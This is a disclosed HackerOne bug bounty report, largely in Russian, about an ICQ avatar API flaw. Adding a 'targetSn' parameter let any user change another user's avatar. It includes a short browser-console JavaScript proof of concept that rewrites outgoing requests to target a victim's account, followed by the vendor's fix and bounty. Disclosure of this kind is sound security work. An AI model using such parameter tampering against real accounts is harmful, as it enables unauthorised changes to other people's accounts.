{"id":786745,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83ODY3NDU=","url":"https://hackerone.com/reports/786745","title":"[API] ICQ user's avatar can be manipulated remotely","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2020-01-31T08:36:43.169Z","submitted_at":"2020-01-31T08:36:43.169Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"rainbow_json","url":"/rainbow_json","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/RxP3Gxzu23uQmte4jxixmtrC/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":65,"url":"https://hackerone.com/mailru","handle":"mailru","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Mail.ru","twitter_handle":"mailru","website":"https://corp.mail.ru","about":"Building the Internet since 1998"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-02-14T19:21:04.687Z","bug_reporter_agreed_on_going_public_at":"2020-02-14T19:21:04.610Z","team_member_agreed_on_going_public_at":"2020-02-14T16:13:13.484Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Description:\nПри обращении к API методу установки аватара пользователя (https://ub.icq.net/files/api/v1.1/avatar/set)\nМожно передать дополнительный GET параметр: targetSn - с установленным UIN'ом любого пользователя\nТем самым можем изменить аватарку у любого пользователя\n\n## Steps To Reproduce:\n  1. Открыть Web версию ICQ\n  1. Вставляем в консоль браузера следующий код (Указав вместо ___UIN___ атакуемый аккаунт):\n```\nconst XHR_OPEN = XMLHttpRequest.prototype.open;\n\nXMLHttpRequest.prototype.open = function (...args) {\n  let url = new URL(args[1])\n  if (url.pathname === '/files/api/v1.1/avatar/set') {\n    url.searchParams.set('targetSn', '___UIN___')\n    args[1] = url.toString()\n    console.log(args[1])\n  }\n  return XHR_OPEN.apply(this, args);\n}\n```\n  1. Заменить аватар пользователя\n\n## Скринкаст:\n█████████\n\n## Impact\n\nЧастичный доступ к управлению чужими аккаунтами (возможно уязвимость применима и к другим методам API).","bounty_amount":"1000.0","formatted_bounty":"$1,000","weakness":{"id":107,"name":"Improper Input Validation"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-03-15T16:13:13.577Z","allow_singular_disclosure_after":-49677262.50411599,"singular_disclosure_allowed":true,"vote_count":70,"voters":["a_d_a_m","secator","mashoud1122","romesful","ali","johndoe1492","n4sty","rainbow_json","realtess","ms-13","and 60 more..."],"severity":{"rating":"high","score":7.5,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"none","integrity":"low","availability":"low"}},"structured_scope":{"databaseId":42797,"asset_type":"OTHER","asset_identifier":"ICQ","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":6927110,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Markdown разметка поехала:\n```\nconst XHR_OPEN = XMLHttpRequest.prototype.open;\n\nXMLHttpRequest.prototype.open = function (...args) {\n   let url = new URL(args[1])\n   if (url.pathname === '/files/api/v1.1/avatar/set') {\n      url.searchParams.set('targetSn', '\u003e\u003e\u003e\u003e\u003e\u003e\u003eUIN\u003c\u003c\u003c\u003c\u003c\u003c\u003c')\n      args[1] = url.toString()\n   }\n   return XHR_OPEN.apply(this, args);\n}\n```\n██████","automated_response":false,"created_at":"2020-01-31T08:38:06.261Z","updated_at":"2020-02-14T16:09:44.287Z","actor":{"username":"rainbow_json","cleared":false,"url":"/rainbow_json","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/RxP3Gxzu23uQmte4jxixmtrC/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6927336,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2020-01-31T08:48:24.333Z","updated_at":"2020-01-31T08:48:24.333Z","additional_data":{"old_title":"Устанавливаем ICQ аватарку любому пользователю","new_title":"[API] Частичный доступ к управлению чужими аккаунтами"},"actor":{"username":"rainbow_json","cleared":false,"url":"/rainbow_json","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/RxP3Gxzu23uQmte4jxixmtrC/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6927513,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Привет,\nможешь продемонстрировать смену аватара███████?","automated_response":false,"created_at":"2020-01-31T09:16:36.439Z","updated_at":"2020-02-14T16:09:11.874Z","actor":{"username":"3apa3a","cleared":false,"url":"/3apa3a","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6927558,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Done. Посмотрел по другим методам API. Видимо это применимо только для поддомена ub.icq.net (загрузка аватара)","automated_response":false,"created_at":"2020-01-31T09:26:57.573Z","updated_at":"2020-01-31T09:26:57.573Z","actor":{"username":"rainbow_json","cleared":false,"url":"/rainbow_json","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/RxP3Gxzu23uQmte4jxixmtrC/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6928269,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for reporting this problem to ICQ Team!  We appreciate your time for helping us to make our web services safer.\n\nWe are currently reviewing your submission and will be back in touch soon.","automated_response":false,"created_at":"2020-01-31T09:33:13.313Z","updated_at":"2020-01-31T09:33:13.313Z","actor":{"username":"3apa3a","cleared":false,"url":"/3apa3a","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6928357,"is_internal":false,"editable":false,"type":"Activities::ReassignedToTeam","message":"","automated_response":false,"created_at":"2020-01-31T09:36:31.901Z","updated_at":"2020-01-31T09:36:31.901Z","additional_data":{"old_team":"ICQ","new_team":"Mail.ru"},"actor":{"username":"kpebetka","cleared":false,"url":"/kpebetka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/152/f71d69995e3032fd2225ed83dd75c81e8158a865_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6928376,"is_internal":false,"editable":false,"type":"Activities::ChangedScope","message":"","automated_response":false,"created_at":"2020-01-31T09:37:00.632Z","updated_at":"2020-01-31T09:37:00.632Z","actor":{"username":"kpebetka","cleared":false,"url":"/kpebetka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/152/f71d69995e3032fd2225ed83dd75c81e8158a865_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"old_scope":"None","new_scope":"ICQ","genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6949591,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Привет, бага закрыта.\nПожалуйста, подтверди, что проблема больше не воспроизводится. \n","automated_response":false,"created_at":"2020-02-03T12:10:05.949Z","updated_at":"2020-02-03T12:10:05.949Z","actor":{"username":"kpebetka","cleared":false,"url":"/kpebetka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/152/f71d69995e3032fd2225ed83dd75c81e8158a865_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"rainbow_json","url":"/rainbow_json"},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6949628,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Подтверждаю, при попытке загрузить другому пользователю аватар, сервер отдает ошибку: \n```icon error: 40000[Bad request: target is not chat or sender]```","automated_response":false,"created_at":"2020-02-03T12:16:06.210Z","updated_at":"2020-02-03T12:16:06.210Z","actor":{"username":"rainbow_json","cleared":false,"url":"/rainbow_json","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/RxP3Gxzu23uQmte4jxixmtrC/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6979349,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Привет, вознаграждение за найденную уязвимость начислено на твой аккаунт. На странице https://hackerone.com/settings/bounties можно выбрать желаемый метод выплаты. \n\nСпасибо и ждем от тебя новых багрепортов!","automated_response":false,"created_at":"2020-02-06T14:50:38.848Z","updated_at":"2020-02-06T14:50:38.848Z","actor":{"url":"/mailru","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Mail.ru"}},"bounty_amount":"1000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"mailru","collaborator":{"username":"rainbow_json","url":"/rainbow_json"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7054581,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2020-02-14T15:50:20.777Z","updated_at":"2020-02-14T15:50:20.777Z","additional_data":{"old_title":"[API] Частичный доступ к управлению чужими аккаунтами","new_title":"[API] ICQ user's avatar can be manipulated remotely"},"actor":{"username":"3apa3a","cleared":false,"url":"/3apa3a","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7054618,"is_internal":false,"editable":false,"type":"Activities::ReportVulnerabilityTypesUpdated","message":"","automated_response":false,"created_at":"2020-02-14T15:55:52.548Z","updated_at":"2020-02-14T15:55:52.548Z","additional_data":{"added_weaknesses":[{"id":107,"name":"Improper Input Validation"}],"removed_weaknesses":[]},"actor":{"username":"3apa3a","cleared":false,"url":"/3apa3a","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7054681,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2020-02-14T16:03:37.422Z","updated_at":"2020-02-14T16:03:37.422Z","additional_data":{"old_severity":"High","new_severity":"Medium (6.1)","old_severity_id":622140,"new_severity_id":633904},"actor":{"username":"3apa3a","cleared":false,"url":"/3apa3a","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7054737,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2020-02-14T16:10:54.878Z","updated_at":"2020-02-14T16:10:54.878Z","additional_data":{"old_severity":"Medium (6.1)","new_severity":"High (7.5)","old_severity_id":633904,"new_severity_id":633911},"actor":{"username":"3apa3a","cleared":false,"url":"/3apa3a","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7054752,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-02-14T16:13:13.519Z","updated_at":"2020-02-14T16:13:13.519Z","first_to_agree":true,"actor":{"username":"3apa3a","cleared":false,"url":"/3apa3a","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7056319,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-02-14T19:21:04.637Z","updated_at":"2020-02-14T19:21:04.637Z","actor":{"username":"rainbow_json","cleared":false,"url":"/rainbow_json","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/RxP3Gxzu23uQmte4jxixmtrC/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7056320,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-02-14T19:21:04.715Z","updated_at":"2020-02-14T19:21:04.715Z","actor":{"username":"rainbow_json","cleared":false,"url":"/rainbow_json","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/RxP3Gxzu23uQmte4jxixmtrC/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":20223,"category":"team","content":"An API method of ICQ web interface intended to set a chat avatar could be used to change a displayed person's avatar.","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":4836,"username":"3apa3a","name":"Vladimir Dubrovin","bio":"En la agostada senda he visto al buen lagarto (gota de cocodrilo) meditando. ","cleared":false,"website":"https://3proxy.org/","location":"Nizhny Novgorod, Russia","created_at":"2014-04-10T22:08:47.745Z","url":"https://hackerone.com/3apa3a","anc_triager":false,"hackerone_triager":false,"hackerone_employee":false,"user_type":"company","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/c11036e2d3f8b05af4b5da5984ccdec6f786b763c8abceb4e68042e10dcdae85"}}},{"category":"researcher","can_view?":true,"can_create?":false}]}